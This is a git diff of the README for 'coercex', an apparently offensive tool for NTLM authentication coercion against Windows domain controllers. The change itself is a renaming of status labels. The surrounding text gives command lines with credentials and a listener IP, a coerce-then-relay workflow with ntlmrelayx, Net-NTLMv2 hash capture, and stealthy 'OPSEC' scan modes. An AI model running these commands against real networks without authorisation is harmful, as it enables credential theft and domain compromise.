@@ -21,7 +21,7 @@ focused on performance and scan accuracy for large-scale engagements.
 | **Token-based correlation** | Unique token in every UNC path for definitive callback verification |
 | **Rich TUI** | Live progress bars, findings table, and phase indicators (probe/scan/drain) |
 | **Extra protocols** | MS-PAR and MS-TSCH (19 methods / 7 protocols total vs Coercer's 17 / 5) |
-| **OPSEC modes** | `--stop-on-vulnerable`, `--delay`, `-c 1 --transport http` for low-noise scans |
+| **OPSEC modes** | `--stop-on-coerced`, `--delay`, `-c 1 --transport http` for low-noise scans |
 | **Test suite** | 202 pytest tests covering scanner, listener, display, and method registry |
 
 ## Installation
@@ -43,14 +43,14 @@ coercex scan -t dc01.corp.local -u user -p pass -d corp.local
 # Explicit listener, multiple targets, EFSR only
 coercex scan -T targets.txt -l 10.0.0.5 -u user -p pass --protocols MS-EFSR
 
-# Fast scan -- stop at first confirmed vulnerability per target
-coercex scan -t dc01 -u user -p pass --stop-on-vulnerable
+# Fast scan -- stop at first confirmed coercion per target
+coercex scan -t dc01 -u user -p pass --stop-on-coerced
 
 # Discover pipes before scanning (skips endpoints whose pipes are absent)
 coercex scan -t dc01 -u user -p pass --discover-pipes
 
 # OPSEC-conscious: sequential, HTTP-only, 2 s delay
-coercex scan -t dc01 -u user -p pass --stop-on-vulnerable \
+coercex scan -t dc01 -u user -p pass --stop-on-coerced \
   -c 1 --transport http --delay 2
 ```
 
@@ -99,7 +99,7 @@ coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local
 
 ### Typical workflow
 
-1. **Scan** to find vulnerable methods on the target.
+1. **Scan** to find coercible methods on the target.
 2. **Start ntlmrelayx** (or similar) pointed at the relay target.
 3. **Coerce** with `--methods` to trigger only the working methods.
 
@@ -107,7 +107,7 @@ coercex scan -t dc01 -u admin --aes-key 4a3f... -k --dc-host dc01.corp.local
 
 | Status | Symbol | Meaning |
 |--------|--------|---------|
-| `VULNERABLE` | `[+]` | Callback confirmed on our listener (strongest signal) |
+| `COERCED` | `[+]` | Callback confirmed on our listener (strongest signal) |
 | `ACCESSIBLE` | `[~]` | RPC accepted our path but no callback yet |
 | `SENT` | `[>]` | Coerce mode -- trigger dispatched, no verification |
 | `ACCESS_DENIED` | `[-]` | RPC returned access denied |
@@ -157,7 +157,7 @@ coercex coerce -t dc01 -l 10.0.0.5 -u user -p pass \
 2. **Pre-flight probe** -- tests connectivity to unique RPC bindings; skips
    unreachable endpoints.
 3. **Scan / Coerce** -- fires triggers with per-target progress bars.
-4. **Drain** -- waits for late callbacks; enriches VULNERABLE results with
+4. **Drain** -- waits for late callbacks; enriches COERCED results with
    captured Net-NTLMv2 hashes.
 
 ## Port Redirect
